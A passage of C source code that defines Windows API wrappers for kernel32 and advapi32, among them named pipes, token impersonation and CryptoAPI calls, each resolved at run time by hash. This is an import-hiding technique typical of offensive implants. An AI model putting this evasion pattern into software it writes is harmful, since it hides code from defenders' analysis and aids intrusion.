        return pCreateNamedPipeA(lpName, dwOpenMode, dwPipeMode, nMaxInstances, nOutBufferSize, nInBufferSize, nDefaultTimeOut, lpSecurityAttributes);
    }
    return INVALID_HANDLE_VALUE;
}

BOOL winapi_kernel32_ConnectNamedPipe(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped) {
    BOOL (WINAPI *pConnectNamedPipe)(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped) = GetFunctionH(KERNEL32_DLL, H_ConnectNamedPipe);
    dprintf("[WINAPI][winapi_kernel32_ConnectNamedPipe] Calling ConnectNamedPipe @ %p", pConnectNamedPipe);
    if (pConnectNamedPipe) {
        return pConnectNamedPipe(hNamedPipe, lpOverlapped);
    }
    return FALSE;
}

BOOL winapi_kernel32_GetOverlappedResult(HANDLE hFile, LPOVERLAPPED lpOverlapped, LPDWORD lpNumberOfBytesTransferred, BOOL bWait) {
    BOOL (WINAPI *pGetOverlappedResult)(HANDLE hFile, LPOVERLAPPED lpOverlapped, LPDWORD lpNumberOfBytesTransferred, BOOL bWait) = GetFunctionH(KERNEL32_DLL, H_GetOverlappedResult);
    dprintf("[WINAPI][winapi_kernel32_GetOverlappedResult] Calling GetOverlappedResult @ %p", pGetOverlappedResult);
    if (pGetOverlappedResult) {
        return pGetOverlappedResult(hFile, lpOverlapped, lpNumberOfBytesTransferred, bWait);
    }
    return FALSE;
}

BOOL winapi_kernel32_ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped) {
    BOOL (WINAPI *pReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped) = GetFunctionH(KERNEL32_DLL, H_ReadFile);
    dprintf("[WINAPI][winapi_kernel32_ReadFile] Calling ReadFile @ %p", pReadFile);
    if (pReadFile) {
        return pReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
    }
    return FALSE;
}

HANDLE winapi_kernel32_CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
    HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) = GetFunctionH(KERNEL32_DLL, H_CreateThread);
    dprintf("[WINAPI][winapi_kernel32_CreateThread] Calling CreateThread @ %p", pCreateThread);
    if (pCreateThread) {
        return pCreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
    }
    return NULL;
}

BOOL winapi_kernel32_ResetEvent(HANDLE hEvent) {
    BOOL (WINAPI *pResetEvent)(HANDLE hEvent) = GetFunctionH(KERNEL32_DLL, H_ResetEvent);
    dprintf("[WINAPI][winapi_kernel32_ResetEvent] Calling ResetEvent @ %p", pResetEvent);
    if (pResetEvent) {
        return pResetEvent(hEvent);
    }
    return FALSE;
}

BOOL winapi_kernel32_SetThreadErrorMode(DWORD dwNewMode, LPDWORD lpOldMode) {
    BOOL (WINAPI *pSetThreadErrorMode)(DWORD dwNewMode, LPDWORD lpOldMode) = GetFunctionH(KERNEL32_DLL, H_SetThreadErrorMode);
    dprintf("[WINAPI][winapi_kernel32_SetThreadErrorMode] Calling SetThreadErrorMode @ %p", pSetThreadErrorMode);
    if (pSetThreadErrorMode) {
        return pSetThreadErrorMode(dwNewMode, lpOldMode);
    }
    return FALSE;
}

HMODULE winapi_kernel32_GetModuleHandleA(LPCSTR lpModuleName) {
    HMODULE (WINAPI *pGetModuleHandleA)(LPCSTR) = GetFunctionH(KERNEL32_DLL, H_GetModuleHandleA);
    dprintf("[WINAPI][winapi_kernel32_GetModuleHandleA] Calling GetModuleHandleA @ %p", pGetModuleHandleA);
    if (pGetModuleHandleA) {
        return pGetModuleHandleA(lpModuleName);
    }
    return NULL;
}

HANDLE winapi_kernel32_CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
    HANDLE (WINAPI *pCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE) = GetFunctionH(KERNEL32_DLL, H_CreateFileW);
    dprintf("[WINAPI][winapi_kernel32_CreateFileW] Calling CreateFileW @ %p", pCreateFileW);
    if (pCreateFileW) {
        return pCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
    }
    return INVALID_HANDLE_VALUE;
}

HANDLE winapi_kernel32_CreateNamedPipeW(LPCWSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes) {
    HANDLE (WINAPI *pCreateNamedPipeW)(LPCWSTR, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, LPSECURITY_ATTRIBUTES) = GetFunctionH(KERNEL32_DLL, H_CreateNamedPipeW);
    dprintf("[WINAPI][winapi_kernel32_CreateNamedPipeW] Calling CreateNamedPipeW @ %p", pCreateNamedPipeW);
    if (pCreateNamedPipeW) {
        return pCreateNamedPipeW(lpName, dwOpenMode, dwPipeMode, nMaxInstances, nOutBufferSize, nInBufferSize, nDefaultTimeOut, lpSecurityAttributes);
    }
    return INVALID_HANDLE_VALUE;
}

HANDLE winapi_kernel32_CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName) {
    HANDLE (WINAPI *pCreateEventA)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR) = GetFunctionH(KERNEL32_DLL, H_CreateEventA);
    dprintf("[WINAPI][winapi_kernel32_CreateEventA] Calling CreateEventA @ %p", pCreateEventA);
    if (pCreateEventA) {
        return pCreateEventA(lpEventAttributes, bManualReset, bInitialState, lpName);
    }
    return NULL;
}

HANDLE winapi_kernel32_CreateEventW(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName) {
    HANDLE (WINAPI *pCreateEventW)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR) = GetFunctionH(KERNEL32_DLL, H_CreateEventW);
    dprintf("[WINAPI][winapi_kernel32_CreateEventW] Calling CreateEventW @ %p", pCreateEventW);
    if (pCreateEventW) {
        return pCreateEventW(lpEventAttributes, bManualReset, bInitialState, lpName);
    }
    return NULL;
}

BOOL winapi_kernel32_SetEvent(HANDLE hEvent) {
    BOOL (WINAPI *pSetEvent)(HANDLE) = GetFunctionH(KERNEL32_DLL, H_SetEvent);
    dprintf("[WINAPI][winapi_kernel32_SetEvent] Calling SetEvent @ %p", pSetEvent);
    if (pSetEvent) {
        return pSetEvent(hEvent);
    }
    return FALSE;
}

DWORD winapi_kernel32_WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
    DWORD (WINAPI *pWaitForSingleObject)(HANDLE, DWORD) = GetFunctionH(KERNEL32_DLL, H_WaitForSingleObject);
    dprintf("[WINAPI][winapi_kernel32_WaitForSingleObject] Calling WaitForSingleObject @ %p", pWaitForSingleObject);
    if (pWaitForSingleObject) {
        return pWaitForSingleObject(hHandle, dwMilliseconds);
    }
    return WAIT_FAILED;
}

VOID winapi_kernel32_Sleep(DWORD dwMilliseconds) {
    VOID (WINAPI *pSleep)(DWORD) = GetFunctionH(KERNEL32_DLL, H_Sleep);
    dprintf("[WINAPI][winapi_kernel32_Sleep] Calling Sleep @ %p", pSleep);
    if (pSleep) {
        pSleep(dwMilliseconds);
    }
}

HANDLE winapi_kernel32_GetProcessHeap(VOID) {
    HANDLE (WINAPI *pGetProcessHeap)(VOID) = GetFunctionH(KERNEL32_DLL, H_GetProcessHeap);
    dprintf("[WINAPI][winapi_kernel32_GetProcessHeap] Calling GetProcessHeap @ %p", pGetProcessHeap);
    if (pGetProcessHeap) {
        return pGetProcessHeap();
    }
    return NULL;
}

LPVOID winapi_kernel32_HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes) {
    LPVOID (WINAPI *pHeapAlloc)(HANDLE, DWORD, SIZE_T) = GetFunctionH(KERNEL32_DLL, H_HeapAlloc);
    dprintf("[WINAPI][winapi_kernel32_HeapAlloc] Calling HeapAlloc @ %p", pHeapAlloc);
    if (pHeapAlloc) {
        return pHeapAlloc(hHeap, dwFlags, dwBytes);
    }
    return NULL;
}

BOOL winapi_kernel32_HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem) {
    BOOL (WINAPI *pHeapFree)(HANDLE, DWORD, LPVOID) = GetFunctionH(KERNEL32_DLL, H_HeapFree);
    dprintf("[WINAPI][winapi_kernel32_HeapFree] Calling HeapFree @ %p", pHeapFree);
    if (pHeapFree) {
        return pHeapFree(hHeap, dwFlags, lpMem);
    }
    return FALSE;
}

BOOL winapi_kernel32_IsWow64Process(HANDLE hProcess, PBOOL Wow64Process) {
    BOOL (WINAPI *pIsWow64Process)(HANDLE, PBOOL) = GetFunctionH(KERNEL32_DLL, H_IsWow64Process);
    dprintf("[WINAPI][winapi_kernel32_IsWow64Process] Calling IsWow64Process @ %p", pIsWow64Process);
    if (pIsWow64Process) {
        return pIsWow64Process(hProcess, Wow64Process);
    }
    return FALSE;
}

BOOL winapi_kernel32_ProcessIdToSessionId(DWORD dwProcessId, DWORD* pSessionId) {
    BOOL (WINAPI *pProcessIdToSessionId)(DWORD, DWORD*) = GetFunctionH(KERNEL32_DLL, H_ProcessIdToSessionId);
    dprintf("[WINAPI][winapi_kernel32_ProcessIdToSessionId] Calling ProcessIdToSessionId @ %p", pProcessIdToSessionId);
    if (pProcessIdToSessionId) {
        return pProcessIdToSessionId(dwProcessId, pSessionId);
    }
    return FALSE;
}

// END: kernel32.dll
// START: kernel32 extensions.dll

LPVOID winapi_kernel32_HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes) {
    LPVOID (WINAPI *pHeapReAlloc)(HANDLE, DWORD, LPVOID, SIZE_T) = GetFunctionH(KERNEL32_DLL, H_HeapReAlloc);
    dprintf("[WINAPI][winapi_kernel32_HeapReAlloc] Calling HeapReAlloc @ %p", pHeapReAlloc);
    if (pHeapReAlloc) {
        return pHeapReAlloc(hHeap, dwFlags, lpMem, dwBytes);
    }
    return NULL;
}

HLOCAL winapi_kernel32_LocalAlloc(UINT uFlags, SIZE_T uBytes) {
    HLOCAL (WINAPI *pLocalAlloc)(UINT, SIZE_T) = GetFunctionH(KERNEL32_DLL, H_LocalAlloc);
    dprintf("[WINAPI][winapi_kernel32_LocalAlloc] Calling LocalAlloc @ %p", pLocalAlloc);
    if (pLocalAlloc) {
        return pLocalAlloc(uFlags, uBytes);
    }
    return NULL;
}

VOID winapi_kernel32_GetSystemTime(LPSYSTEMTIME lpSystemTime) {
    VOID (WINAPI *pGetSystemTime)(LPSYSTEMTIME) = GetFunctionH(KERNEL32_DLL, H_GetSystemTime);
    dprintf("[WINAPI][winapi_kernel32_GetSystemTime] Calling GetSystemTime @ %p", pGetSystemTime);
    if (pGetSystemTime) {
        pGetSystemTime(lpSystemTime);
    }
}

BOOL winapi_kernel32_SystemTimeToFileTime(const SYSTEMTIME* lpSystemTime, LPFILETIME lpFileTime) {
    BOOL (WINAPI *pSystemTimeToFileTime)(const SYSTEMTIME*, LPFILETIME) = GetFunctionH(KERNEL32_DLL, H_SystemTimeToFileTime);
    dprintf("[WINAPI][winapi_kernel32_SystemTimeToFileTime] Calling SystemTimeToFileTime @ %p", pSystemTimeToFileTime);
    if (pSystemTimeToFileTime) {
        return pSystemTimeToFileTime(lpSystemTime, lpFileTime);
    }
    return FALSE;
}

int winapi_kernel32_MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar) {
    int (WINAPI *pMultiByteToWideChar)(UINT, DWORD, LPCCH, int, LPWSTR, int) = GetFunctionH(KERNEL32_DLL, H_MultiByteToWideChar);
    dprintf("[WINAPI][winapi_kernel32_MultiByteToWideChar] Calling MultiByteToWideChar @ %p", pMultiByteToWideChar);
    if (pMultiByteToWideChar) {
        return pMultiByteToWideChar(CodePage, dwFlags, lpMultiByteStr, cbMultiByte, lpWideCharStr, cchWideChar);
    }
    return 0;
}

int winapi_kernel32_WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar) {
    int (WINAPI *pWideCharToMultiByte)(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL) = GetFunctionH(KERNEL32_DLL, H_WideCharToMultiByte);
    dprintf("[WINAPI][winapi_kernel32_WideCharToMultiByte] Calling WideCharToMultiByte @ %p", pWideCharToMultiByte);
    if (pWideCharToMultiByte) {
        return pWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);
    }
    return 0;
}

BOOL winapi_kernel32_PeekNamedPipe(HANDLE hNamedPipe, LPVOID lpBuffer, DWORD nBufferSize, LPDWORD lpBytesRead, LPDWORD lpTotalBytesAvail, LPDWORD lpBytesLeftThisMessage) {
    BOOL (WINAPI *pPeekNamedPipe)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD) = GetFunctionH(KERNEL32_DLL, H_PeekNamedPipe);
    dprintf("[WINAPI][winapi_kernel32_PeekNamedPipe] Calling PeekNamedPipe @ %p", pPeekNamedPipe);
    if (pPeekNamedPipe) {
        return pPeekNamedPipe(hNamedPipe, lpBuffer, nBufferSize, lpBytesRead, lpTotalBytesAvail, lpBytesLeftThisMessage);
    }
    return FALSE;
}

BOOL winapi_kernel32_SetNamedPipeHandleState(HANDLE hNamedPipe, LPDWORD lpMode, LPDWORD lpMaxCollectionCount, LPDWORD lpCollectDataTimeout) {
    BOOL (WINAPI *pSetNamedPipeHandleState)(HANDLE, LPDWORD, LPDWORD, LPDWORD) = GetFunctionH(KERNEL32_DLL, H_SetNamedPipeHandleState);
    dprintf("[WINAPI][winapi_kernel32_SetNamedPipeHandleState] Calling SetNamedPipeHandleState @ %p", pSetNamedPipeHandleState);
    if (pSetNamedPipeHandleState) {
        return pSetNamedPipeHandleState(hNamedPipe, lpMode, lpMaxCollectionCount, lpCollectDataTimeout);
    }
    return FALSE;
}

BOOL winapi_kernel32_ReleaseMutex(HANDLE hMutex) {
    BOOL (WINAPI *pReleaseMutex)(HANDLE) = GetFunctionH(KERNEL32_DLL, H_ReleaseMutex);
    dprintf("[WINAPI][winapi_kernel32_ReleaseMutex] Calling ReleaseMutex @ %p", pReleaseMutex);
    if (pReleaseMutex) {
        return pReleaseMutex(hMutex);
    }
    return FALSE;
}

HANDLE winapi_kernel32_CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName) {
    HANDLE (WINAPI *pCreateMutexA)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR) = GetFunctionH(KERNEL32_DLL, H_CreateMutexA);
    dprintf("[WINAPI][winapi_kernel32_CreateMutexA] Calling CreateMutexA @ %p", pCreateMutexA);
    if (pCreateMutexA) {
        return pCreateMutexA(lpMutexAttributes, bInitialOwner, lpName);
    }
    return NULL;
}

HANDLE winapi_kernel32_CreateMutexW(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCWSTR lpName) {
    HANDLE (WINAPI *pCreateMutexW)(LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR) = GetFunctionH(KERNEL32_DLL, H_CreateMutexW);
    dprintf("[WINAPI][winapi_kernel32_CreateMutexW] Calling CreateMutexW @ %p", pCreateMutexW);
    if (pCreateMutexW) {
        return pCreateMutexW(lpMutexAttributes, bInitialOwner, lpName);
    }
    return NULL;
}

BOOL winapi_kernel32_TerminateThread(HANDLE hThread, DWORD dwExitCode) {
    BOOL (WINAPI *pTerminateThread)(HANDLE, DWORD) = GetFunctionH(KERNEL32_DLL, H_TerminateThread);
    dprintf("[WINAPI][winapi_kernel32_TerminateThread] Calling TerminateThread @ %p", pTerminateThread);
    if (pTerminateThread) {
        return pTerminateThread(hThread, dwExitCode);
    }
    return FALSE;
}

int winapi_kernel32_lstrcmpW(LPCWSTR lpString1, LPCWSTR lpString2) {
    int (WINAPI *plstrcmpW)(LPCWSTR, LPCWSTR) = GetFunctionH(KERNEL32_DLL, H_lstrcmpW);
    dprintf("[WINAPI][winapi_kernel32_lstrcmpW] Calling lstrcmpW @ %p", plstrcmpW);
    if (plstrcmpW) {
        return plstrcmpW(lpString1, lpString2);
    }
    return 0;
}

// END: kernel32 extensions.dll
// START: advapi32.dll

BOOL winapi_advapi32_OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle) {
    BOOL (WINAPI *pOpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle) = GetFunctionH(ADVAPI32_DLL, H_OpenProcessToken);
    dprintf("[WINAPI][winapi_advapi32_OpenProcessToken] Calling OpenProcessToken @ %p", pOpenProcessToken);
    if (pOpenProcessToken) {
        return pOpenProcessToken(ProcessHandle, DesiredAccess, TokenHandle);
    }
    return FALSE;
}

BOOL winapi_advapi32_AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength) {
    BOOL (WINAPI *pAdjustTokenPrivileges)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength) = GetFunctionH(ADVAPI32_DLL, H_AdjustTokenPrivileges);
    dprintf("[WINAPI][winapi_advapi32_AdjustTokenPrivileges] Calling AdjustTokenPrivileges @ %p", pAdjustTokenPrivileges);
    if (pAdjustTokenPrivileges) {
        return pAdjustTokenPrivileges(TokenHandle, DisableAllPrivileges, NewState, BufferLength, PreviousState, ReturnLength);
    }
    return FALSE;
}

BOOL winapi_advapi32_ImpersonateLoggedOnUser(HANDLE hToken) {
    BOOL (WINAPI *pImpersonateLoggedOnUser)(HANDLE hToken) = GetFunctionH(ADVAPI32_DLL, H_ImpersonateLoggedOnUser);
    dprintf("[WINAPI][winapi_advapi32_ImpersonateLoggedOnUser] Calling ImpersonateLoggedOnUser @ %p", pImpersonateLoggedOnUser);
    if (pImpersonateLoggedOnUser) {
        return pImpersonateLoggedOnUser(hToken);
    }
    return FALSE;
}

BOOL winapi_advapi32_CryptDuplicateKey(HCRYPTKEY hKey, DWORD* pdwReserved, DWORD dwFlags, HCRYPTKEY* phKey) {
    BOOL (WINAPI *pCryptDuplicateKey)(HCRYPTKEY hKey, DWORD* pdwReserved, DWORD dwFlags, HCRYPTKEY* phKey) = GetFunctionH(ADVAPI32_DLL, H_CryptDuplicateKey);
    dprintf("[WINAPI][winapi_advapi32_CryptDuplicateKey] Calling CryptDuplicateKey @ %p", pCryptDuplicateKey);
    if (pCryptDuplicateKey) {
        return pCryptDuplicateKey(hKey, pdwReserved, dwFlags, phKey);
    }
    return FALSE;
}

BOOL winapi_advapi32_CryptSetKeyParam(HCRYPTKEY hKey, DWORD dwParam, const BYTE* pbData, DWORD dwFlags) {
    BOOL (WINAPI *pCryptSetKeyParam)(HCRYPTKEY hKey, DWORD dwParam, const BYTE* pbData, DWORD dwFlags) = GetFunctionH(ADVAPI32_DLL, H_CryptSetKeyParam);
    dprintf("[WINAPI][winapi_advapi32_CryptSetKeyParam] Calling CryptSetKeyParam @ %p", pCryptSetKeyParam);
    if (pCryptSetKeyParam) {
        return pCryptSetKeyParam(hKey, dwParam, pbData, dwFlags);
    }
    return FALSE;
}

BOOL winapi_advapi32_CryptDecrypt(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE* pbData, DWORD* pdwDataLen) {
    BOOL (WINAPI *pCryptDecrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE* pbData, DWORD* pdwDataLen) = GetFunctionH(ADVAPI32_DLL, H_CryptDecrypt);
    dprintf("[WINAPI][winapi_advapi32_CryptDecrypt] Calling CryptDecrypt @ %p", pCryptDecrypt);
    if (pCryptDecrypt) {
        return pCryptDecrypt(hKey, hHash, Final, dwFlags, pbData, pdwDataLen);
    }
    return FALSE;
}

BOOL winapi_advapi32_CryptGenRandom(HCRYPTPROV hProv, DWORD dwLen, BYTE* pbBuffer) {
    BOOL (WINAPI *pCryptGenRandom)(HCRYPTPROV hProv, DWORD dwLen, BYTE* pbBuffer) = GetFunctionH(ADVAPI32_DLL, H_CryptGenRandom);
    dprintf("[WINAPI][winapi_advapi32_CryptGenRandom] Calling CryptGenRandom @ %p", pCryptGenRandom);
    if (pCryptGenRandom) {
        return pCryptGenRandom(hProv, dwLen, pbBuffer);
    }
    return FALSE;
}

BOOL winapi_advapi32_CryptEncrypt(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE* pbData, DWORD* pdwDataLen, DWORD dwBufLen) {
    BOOL (WINAPI *pCryptEncrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE* pbData, DWORD* pdwDataLen, DWORD dwBufLen) = GetFunctionH(ADVAPI32_DLL, H_CryptEncrypt);
    dprintf("[WINAPI][winapi_advapi32_CryptEncrypt] Calling CryptEncrypt @ %p", pCryptEncrypt);
    if (pCryptEncrypt) {
        return pCryptEncrypt(hKey, hHash, Final, dwFlags, pbData, pdwDataLen, dwBufLen);
    }
    return FALSE;
}

BOOL winapi_advapi32_CryptDestroyKey(HCRYPTKEY hKey) {
    BOOL (WINAPI *pCryptDestroyKey)(HCRYPTKEY hKey) = GetFunctionH(ADVAPI32_DLL, H_CryptDestroyKey);
    dprintf("[WINAPI][winapi_advapi32_CryptDestroyKey] Calling CryptDestroyKey @ %p", pCryptDestroyKey);
    if (pCryptDestroyKey) {
        return pCryptDestroyKey(hKey);
    }
    return FALSE;
}

BOOL winapi_advapi32_CryptReleaseContext(HCRYPTPROV hProv, DWORD dwFlags) {
    BOOL (WINAPI *pCryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags) = GetFunctionH(ADVAPI32_DLL, H_CryptReleaseContext);
    dprintf("[WINAPI][winapi_advapi32_CryptReleaseContext] Calling CryptReleaseContext @ %p", pCryptReleaseContext);
    if (pCryptReleaseContext) {
        return pCryptReleaseContext(hProv, dwFlags);
    }
    return FALSE;
}

BOOL winapi_advapi32_CryptImportKey(HCRYPTPROV hProv, const BYTE* pbData, DWORD dwDataLen, HCRYPTKEY hPubKey, DWORD dwFlags, HCRYPTKEY* phKey) {
    BOOL (WINAPI *pCryptImportKey)(HCRYPTPROV hProv, const BYTE* pbData, DWORD dwDataLen, HCRYPTKEY hPubKey, DWORD dwFlags, HCRYPTKEY* phKey) = GetFunctionH(ADVAPI32_DLL, H_CryptImportKey);
    dprintf("[WINAPI][winapi_advapi32_CryptImportKey] Calling CryptImportKey @ %p", pCryptImportKey);
    if (pCryptImportKey) {
        return pCryptImportKey(hProv, pbData, dwDataLen, hPubKey, dwFlags, phKey);
    }
    return FALSE;
}

BOOL winapi_advapi32_OpenThreadToken(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle) {
    BOOL (WINAPI *pOpenThreadToken)(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle) = GetFunctionH(ADVAPI32_DLL, H_OpenThreadToken);
    dprintf("[WINAPI][winapi_advapi32_OpenThreadToken] Calling OpenThreadToken @ %p", pOpenThreadToken);
    if (pOpenThreadToken) {
        return pOpenThreadToken(ThreadHandle, DesiredAccess, OpenAsSelf, TokenHandle);
    }
    return FALSE;
}

BOOL winapi_advapi32_AllocateAndInitializeSid(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD dwSubAuthority0, DWORD dwSubAuthority1, DWORD dwSubAuthority2, DWORD dwSubAuthority3, DWORD dwSubAuthority4, DWORD dwSubAuthority5, DWORD dwSubAuthority6, DWORD dwSubAuthority7, PSID* pSid) {
    BOOL (WINAPI *pAllocateAndInitializeSid)(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD dwSubAuthority0, DWORD dwSubAuthority1, DWORD dwSubAuthority2, DWORD dwSubAuthority3, DWORD dwSubAuthority4, DWORD dwSubAuthority5, DWORD dwSubAuthority6, DWORD dwSubAuthority7, PSID* pSid) = GetFunctionH(ADVAPI32_DLL, H_AllocateAndInitializeSid);
    dprintf("[WINAPI][winapi_advapi32_AllocateAndInitializeSid] Calling AllocateAndInitializeSid @ %p", pAllocateAndInitializeSid);
    if (pAllocateAndInitializeSid) {
        return pAllocateAndInitializeSid(pIdentifierAuthority, nSubAuthorityCount, dwSubAuthority0, dwSubAuthority1, dwSubAuthority2, dwSubAuthority3, dwSubAuthority4, dwSubAuthority5, dwSubAuthority6, dwSubAuthority7, pSid);
    }
    return FALSE;
}

DWORD winapi_advapi32_SetEntriesInAclW(ULONG cCountOfExplicitEntries, PEXPLICIT_ACCESS_W pListOfExplicitEntries, PACL OldAcl, PACL* NewAcl) {
    DWORD (WINAPI *pSetEntriesInAclW)(ULONG cCountOfExplicitEntries, PEXPLICIT_ACCESS_W pListOfExplicitEntries, PACL OldAcl, PACL* NewAcl) = GetFunctionH(ADVAPI32_DLL, H_SetEntriesInAclW);
    dprintf("[WINAPI][winapi_advapi32_SetEntriesInAclW] Calling SetEntriesInAclW @ %p", pSetEntriesInAclW);
    if (pSetEntriesInAclW) {
        return pSetEntriesInAclW(cCountOfExplicitEntries, pListOfExplicitEntries, OldAcl, NewAcl);
    }
    return ERROR_INVALID_FUNCTION; // Generic error code
}

BOOL winapi_advapi32_InitializeAcl(PACL pAcl, DWORD nAclLength, DWORD dwAclRevision) {
    BOOL (WINAPI *pInitializeAcl)(PACL pAcl, DWORD nAclLength, DWORD dwAclRevision) = GetFunctionH(ADVAPI32_DLL, H_InitializeAcl);
    dprintf("[WINAPI][winapi_advapi32_InitializeAcl] Calling InitializeAcl @ %p", pInitializeAcl);
    if (pInitializeAcl) {
        return pInitializeAcl(pAcl, nAclLength, dwAclRevision);
    }
    return FALSE;
}

BOOL winapi_advapi32_InitializeSecurityDescriptor(PSECURITY_DESCRIPTOR pSecurityDescriptor, DWORD dwRevision) {
    BOOL (WINAPI *pInitializeSecurityDescriptor)(PSECURITY_DESCRIPTOR pSecurityDescriptor, DWORD dwRevision) = GetFunctionH(ADVAPI32_DLL, H_InitializeSecurityDescriptor);
    dprintf("[WINAPI][winapi_advapi32_InitializeSecurityDescriptor] Calling InitializeSecurityDescriptor @ %p", pInitializeSecurityDescriptor);
    if (pInitializeSecurityDescriptor) {
        return pInitializeSecurityDescriptor(pSecurityDescriptor, dwRevision);
    }
    return FALSE;
}

BOOL winapi_advapi32_SetSecurityDescriptorDacl(PSECURITY_DESCRIPTOR pSecurityDescriptor, BOOL bDaclPresent, PACL pDacl, BOOL bDaclDefaulted) {
    BOOL (WINAPI *pSetSecurityDescriptorDacl)(PSECURITY_DESCRIPTOR pSecurityDescriptor, BOOL bDaclPresent, PACL pDacl, BOOL bDaclDefaulted) = GetFunctionH(ADVAPI32_DLL, H_SetSecurityDescriptorDacl);
    dprintf("[WINAPI][winapi_advapi32_SetSecurityDescriptorDacl] Calling SetSecurityDescriptorDacl @ %p", pSetSecurityDescriptorDacl);
    if (pSetSecurityDescriptorDacl) {
        return pSetSecurityDescriptorDacl(pSecurityDescriptor, bDaclPresent, pDacl, bDaclDefaulted);
    }
    return FALSE;
}

BOOL winapi_advapi32_SetSecurityDescriptorSacl(PSECURITY_DESCRIPTOR pSecurityDescriptor, BOOL bSaclPresent, PACL pSacl, BOOL bSaclDefaulted) {
    BOOL (WINAPI *pSetSecurityDescriptorSacl)(PSECURITY_DESCRIPTOR pSecurityDescriptor, BOOL bSaclPresent, PACL pSacl, BOOL bSaclDefaulted) = GetFunctionH(ADVAPI32_DLL, H_SetSecurityDescriptorSacl);
    dprintf("[WINAPI][winapi_advapi32_SetSecurityDescriptorSacl] Calling SetSecurityDescriptorSacl @ %p", pSetSecurityDescriptorSacl);
    if (pSetSecurityDescriptorSacl) {
        return pSetSecurityDescriptorSacl(pSecurityDescriptor, bSaclPresent, pSacl, bSaclDefaulted);
    }
    return FALSE;
}

BOOL winapi_advapi32_LookupPrivilegeValueW(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid) {
    BOOL (WINAPI *pLookupPrivilegeValueW)(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid) = GetFunctionH(ADVAPI32_DLL, H_LookupPrivilegeValueW);
    dprintf("[WINAPI][winapi_advapi32_LookupPrivilegeValueW] Calling LookupPrivilegeValueW @ %p", pLookupPrivilegeValueW);
